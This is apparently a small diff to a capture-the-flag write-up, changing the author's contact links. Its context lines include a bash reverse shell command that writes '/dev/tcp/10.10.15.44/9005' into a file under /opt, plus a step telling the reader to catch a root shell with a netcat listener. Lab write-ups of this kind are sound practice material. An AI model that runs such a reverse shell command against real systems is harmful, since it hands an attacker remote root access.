@@ -82,6 +82,6 @@ echo ‘Ejecutar comando : bash –i >& /dev/tcp/10.10.15.44/9005 0>&1’ > /opt
 Set a netcat listener and wait a while; get the reverse shell as root.  That’s it. (ooh, I lost that screenshot, a I don’t want to do this annoying box again!!)
 Hope you enjoyed; Happy Hacking.
 
-Contact: [mail](aldersone213@gmail.com)   || [twitter](twitter.com/404_NoNameFound)  || [reddit](reddit.com/u/souvuo)
+Contact: [mail](aldersone213@gmail.com)   || [twitter](https://twitter.com/404_NoNameFound)  || [reddit](https://reddit.com/u/souvuo)
 
     Author:	Ald3rs0n
